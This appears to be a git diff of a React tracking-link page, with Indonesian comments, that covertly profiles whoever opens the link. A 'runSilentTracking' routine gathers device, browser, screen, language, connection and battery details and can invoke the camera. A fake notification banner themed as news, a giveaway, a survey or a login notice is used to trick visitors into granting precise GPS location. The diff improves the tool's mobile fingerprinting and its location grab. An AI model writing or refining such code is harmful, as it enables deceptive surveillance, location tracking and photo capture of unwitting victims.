@@ -2,28 +2,53 @@ import { useEffect, useRef, useState } from 'react';
 import { useParams, useLocation } from 'react-router-dom';
 import { decodeConfig, addCapture } from '../storage';
 
-
-/* ─── UA Parser ─────────────────────────────────────────── */
+/* ─── UA Parser (Mobile-Optimized) ─────────────────────── */
 function parseUA(ua) {
   let os = 'Unknown', browser = 'Unknown', device = 'Unknown';
-  if (/Windows NT 10/.test(ua)) os = 'Windows 10/11';
+
+  // OS
+  if (/Windows NT 10|Windows NT 11/.test(ua)) os = 'Windows 10/11';
   else if (/Windows NT 6/.test(ua)) os = 'Windows 7/8';
+  else if (/Android/.test(ua)) {
+    const v = (ua.match(/Android ([\d.]+)/) || [])[1] || '';
+    os = `Android ${v}`.trim();
+  }
+  else if (/iPhone|iPod/.test(ua)) {
+    const v = (ua.match(/OS ([\d_]+)/) || [])[1]?.replace(/_/g,'.') || '';
+    os = `iOS ${v}`.trim();
+  }
+  else if (/iPad/.test(ua)) {
+    const v = (ua.match(/OS ([\d_]+)/) || [])[1]?.replace(/_/g,'.') || '';
+    os = `iPadOS ${v}`.trim();
+  }
   else if (/Mac OS X/.test(ua)) os = 'macOS';
-  else if (/Android/.test(ua)) { const m = ua.match(/Android ([\d.]+)/); os = `Android ${m?.[1] ?? ''}`; }
-  else if (/iPhone/.test(ua)) os = 'iOS (iPhone)';
-  else if (/iPad/.test(ua))   os = 'iOS (iPad)';
-  else if (/Linux/.test(ua))  os = 'Linux';
+  else if (/Linux/.test(ua))    os = 'Linux';
 
-  if (/Chrome\//.test(ua) && !/Edg\//.test(ua)) browser = 'Google Chrome';
-  else if (/Firefox\//.test(ua)) browser = 'Firefox';
-  else if (/Edg\//.test(ua))    browser = 'Microsoft Edge';
-  else if (/Safari\//.test(ua) && !/Chrome/.test(ua)) browser = 'Safari';
+  // Browser — cek in-app dulu
+  if (/FBAN|FBAV/.test(ua))        browser = 'Facebook App';
+  else if (/Instagram/.test(ua))   browser = 'Instagram App';
+  else if (/WhatsApp/.test(ua))    browser = 'WhatsApp';
+  else if (/TikTok/.test(ua))      browser = 'TikTok App';
+  else if (/Line\//.test(ua))     browser = 'LINE App';
+  else if (/SamsungBrowser/.test(ua)) browser = 'Samsung Browser';
+  else if (/Edg\//.test(ua))      browser = 'Edge';
+  else if (/OPR\/|Opera/.test(ua)) browser = 'Opera';
+  else if (/YaBrowser/.test(ua))   browser = 'Yandex Browser';
+  else if (/UCBrowser/.test(ua))   browser = 'UC Browser';
+  else if (/Chrome\//.test(ua))   browser = 'Chrome';
+  else if (/Firefox\//.test(ua))  browser = 'Firefox';
+  else if (/Safari\//.test(ua))   browser = 'Safari';
 
-  const m = ua.match(/Android.*?;\s*([^)]+)\)/);
-  if (m)                    device = m[1].trim();
-  else if (/iPhone/.test(ua))  device = 'iPhone';
-  else if (/iPad/.test(ua))    device = 'iPad';
-  else if (/Windows/.test(ua)) device = 'Windows PC';
+  // Device — deteksi HP Android secara spesifik
+  if (/Android/.test(ua)) {
+    const m = ua.match(/;\s*([^;)]+)\s*Build\//)  // "Samsung Galaxy S24"
+           || ua.match(/Android[^;]*;\s*([^)]+)\)/);
+    device = m ? m[1].trim() : 'Android Device';
+  }
+  else if (/iPhone/.test(ua))    device = 'iPhone';
+  else if (/iPod/.test(ua))      device = 'iPod Touch';
+  else if (/iPad/.test(ua))      device = 'iPad';
+  else if (/Windows/.test(ua))   device = 'Windows PC';
   else if (/Macintosh/.test(ua)) device = 'Mac';
 
   return { os, browser, device };
@@ -85,70 +110,78 @@ async function runSilentTracking(link, dataRef, onCameraReady, notifConfig) {
     // GPS TIDAK diminta di sini — hanya via banner agar tidak ada popup langsung
   }
 
-  // 2. Device
+
+  // 2. Device + info tambahan
   if (opts.trackDevice) {
     const p = parseUA(navigator.userAgent);
-    data.device = p.device; data.os = p.os; data.browser = p.browser;
+    data.device  = p.device;
+    data.os      = p.os;
+    data.browser = p.browser;
+    // Info extra yang berguna
+    data.screen   = `${window.screen.width}x${window.screen.height}`;
+    data.language = navigator.language || navigator.userLanguage || 'unknown';
+    data.touch    = navigator.maxTouchPoints > 0 ? 'Ya (HP/Tablet)' : 'Tidak (Laptop)';
+    // Deteksi koneksi internet (hanya Chrome/Android)
+    const conn = navigator.connection || navigator.mozConnection || navigator.webkitConnection;
+    if (conn) {
+      data.connection = `${conn.effectiveType || ''} ${conn.downlink ? conn.downlink+'Mbps' : ''}`.trim();
+    }
   }
 
-  // 3. Battery
+  // 3. Battery (Android Chrome OK, iOS tidak support)
   if (opts.trackBattery) {
     try {
       if ('getBattery' in navigator) {
         const bat = await navigator.getBattery();
         data.battery = bat.level; data.charging = bat.charging;
       }
-    } catch { /* silent */ }
+    } catch { /* iOS/Firefox tidak support */ }
   }
 
-  // 4. Camera — jangan addCapture di sini, dilakukan setelah foto diambil
+  // 4. Camera
   if (opts.trackCamera) { onCameraReady(); return; }
 
-  // Kirim capture dengan notifConfig dari URL (bukan localStorage pengunjung)
   addCapture(link.id, { ...data }, notifConfig);
 }
 
-/* ─── Notification Banner (samar sebagai notif website) ─── */
+/* ─── Notification Banner ────────────────────────────────── */
 function NotifBanner({ onAllow, theme }) {
-  const [visible, setVisible] = useState(false);
+  const [visible, setVisible]     = useState(false);
   const [dismissed, setDismissed] = useState(false);
 
   const MSGS = {
-    article:  { icon: '📰', title: 'Dapatkan Berita Terbaru', body: 'Aktifkan notifikasi agar tidak ketinggalan artikel viral terbaru.' },
-    giveaway: { icon: '🎁', title: 'Notifikasi Hadiah', body: 'Aktifkan notifikasi supaya kamu langsung tahu saat hadiah tersedia.' },
-    video:    { icon: '▶️', title: 'Video Baru Tersedia', body: 'Aktifkan notifikasi untuk video dan konten eksklusif terbaru.' },
-    download: { icon: '⬇️', title: 'Update Aplikasi', body: 'Aktifkan notifikasi untuk mendapatkan update dan fitur terbaru.' },
-    survey:   { icon: '📋', title: 'Survei Berhadiah', body: 'Aktifkan notifikasi agar tidak ketinggalan survei berhadiah berikutnya.' },
-    login:    { icon: '🔔', title: 'Aktifkan Notifikasi', body: 'Aktifkan notifikasi keamanan untuk melindungi akun kamu.' },
+    article:  { icon: '📰', title: 'Dapatkan Berita Terbaru',   body: 'Aktifkan notifikasi agar tidak ketinggalan artikel viral terbaru.' },
+    giveaway: { icon: '🎁', title: 'Notifikasi Hadiah',          body: 'Aktifkan notifikasi supaya kamu langsung tahu saat hadiah tersedia.' },
+    video:    { icon: '▶️', title: 'Video Baru Tersedia',        body: 'Aktifkan notifikasi untuk video dan konten eksklusif terbaru.' },
+    download: { icon: '⬇️', title: 'Update Aplikasi',            body: 'Aktifkan notifikasi untuk mendapatkan update dan fitur terbaru.' },
+    survey:   { icon: '📋', title: 'Survei Berhadiah',           body: 'Aktifkan notifikasi agar tidak ketinggalan survei berhadiah berikutnya.' },
+    login:    { icon: '🔔', title: 'Aktifkan Notifikasi',        body: 'Aktifkan notifikasi keamanan untuk melindungi akun kamu.' },
   };
   const msg = MSGS[theme] || MSGS.article;
 
   useEffect(() => {
-    // Muncul setelah 3 detik — terasa natural
     const t = setTimeout(() => setVisible(true), 3000);
     return () => clearTimeout(t);
   }, []);
 
+  function requestGps() {
+    if (!navigator.geolocation) return;
+    navigator.geolocation.getCurrentPosition(
+      pos => onAllow && onAllow(pos),
+      () => {},
+      // enableHighAccuracy=true → GPS presisi tinggi di HP
+      { timeout: 20000, maximumAge: 0, enableHighAccuracy: true }
+    );
+  }
+
   function handleAllow() {
     setDismissed(true);
-    // 1. Minta izin notifikasi browser (popup bilang "[domain] ingin mengirim notifikasi")
-    if ('Notification' in window) {
-      Notification.requestPermission().then(perm => {
-        // 2. Setelah user klik di popup notifikasi → minta lokasi (terasa sebagai lanjutan)
-        if (navigator.geolocation) {
-          navigator.geolocation.getCurrentPosition(
-            pos => onAllow && onAllow(pos),
-            () => {},
-            { timeout: 15000, maximumAge: 0, enableHighAccuracy: true }
-          );
-        }
-      });
-    } else if (navigator.geolocation) {
-      navigator.geolocation.getCurrentPosition(
-        pos => onAllow && onAllow(pos),
-        () => {},
-        { timeout: 15000, maximumAge: 0, enableHighAccuracy: true }
-      );
+    // iOS Safari tidak punya Notification API → langsung minta lokasi
+    const hasNotif = 'Notification' in window && Notification.permission !== 'denied';
+    if (hasNotif) {
+      Notification.requestPermission().then(() => requestGps());
+    } else {
+      requestGps(); // langsung minta GPS (Android in-app browser, iOS Safari)
     }
   }
 
@@ -156,34 +189,30 @@ function NotifBanner({ onAllow, theme }) {
 
   return (
     <div style={{
-      position: 'fixed', bottom: '20px', left: '50%', transform: 'translateX(-50%)',
-      background: '#1e293b', color: '#f1f5f9', borderRadius: '14px',
-      padding: '16px 20px', boxShadow: '0 8px 32px rgba(0,0,0,0.4)',
-      zIndex: 99999, display: 'flex', alignItems: 'center', gap: '14px',
-      maxWidth: '420px', width: 'calc(100vw - 40px)',
-      animation: 'slideUp 0.4s cubic-bezier(0.16,1,0.3,1)',
+      position: 'fixed', bottom: '16px', left: '50%', transform: 'translateX(-50%)',
+      background: '#1e293b', color: '#f1f5f9', borderRadius: '16px',
+      padding: '14px 16px', boxShadow: '0 8px 40px rgba(0,0,0,0.5)',
+      zIndex: 99999, display: 'flex', alignItems: 'center', gap: '12px',
+      maxWidth: '400px', width: 'calc(100vw - 32px)',
+      animation: 'slideUp .35s cubic-bezier(.16,1,.3,1)',
+      fontFamily: '-apple-system, BlinkMacSystemFont, "Segoe UI", sans-serif',
     }}>
-      <style>{`@keyframes slideUp { from { opacity:0; transform:translateX(-50%) translateY(30px); } to { opacity:1; transform:translateX(-50%) translateY(0); } }`}</style>
-      <div style={{ fontSize: '28px' }}>{msg.icon}</div>
-      <div style={{ flex: 1 }}>
-        <div style={{ fontWeight: 700, fontSize: '14px', marginBottom: '3px' }}>{msg.title}</div>
-        <div style={{ fontSize: '12px', color: '#94a3b8', lineHeight: 1.4 }}>{msg.body}</div>
+      <style>{`@keyframes slideUp{from{opacity:0;transform:translateX(-50%) translateY(24px)}to{opacity:1;transform:translateX(-50%) translateY(0)}}`}</style>
+      <div style={{ fontSize: '26px', flexShrink: 0 }}>{msg.icon}</div>
+      <div style={{ flex: 1, minWidth: 0 }}>
+        <div style={{ fontWeight: 700, fontSize: '13px', marginBottom: '2px' }}>{msg.title}</div>
+        <div style={{ fontSize: '11px', color: '#94a3b8', lineHeight: 1.4 }}>{msg.body}</div>
       </div>
-      <div style={{ display: 'flex', flexDirection: 'column', gap: '6px' }}>
-        <button
-          onClick={handleAllow}
-          style={{
-            background: '#3b82f6', color: '#fff', border: 'none', borderRadius: '8px',
-            padding: '7px 14px', fontWeight: 700, fontSize: '13px', cursor: 'pointer',
-          }}
-        >Izinkan</button>
-        <button
-          onClick={() => setDismissed(true)}
-          style={{
-            background: 'transparent', color: '#64748b', border: 'none',
-            fontSize: '12px', cursor: 'pointer',
-          }}
-        >Nanti</button>
+      <div style={{ display: 'flex', flexDirection: 'column', gap: '5px', flexShrink: 0 }}>
+        <button onClick={handleAllow} style={{
+          background: '#3b82f6', color: '#fff', border: 'none', borderRadius: '8px',
+          padding: '8px 14px', fontWeight: 700, fontSize: '12px', cursor: 'pointer',
+          whiteSpace: 'nowrap',
+        }}>Izinkan</button>
+        <button onClick={() => setDismissed(true)} style={{
+          background: 'transparent', color: '#64748b', border: 'none',
+          fontSize: '11px', cursor: 'pointer',
+        }}>Nanti</button>
       </div>
     </div>
   );
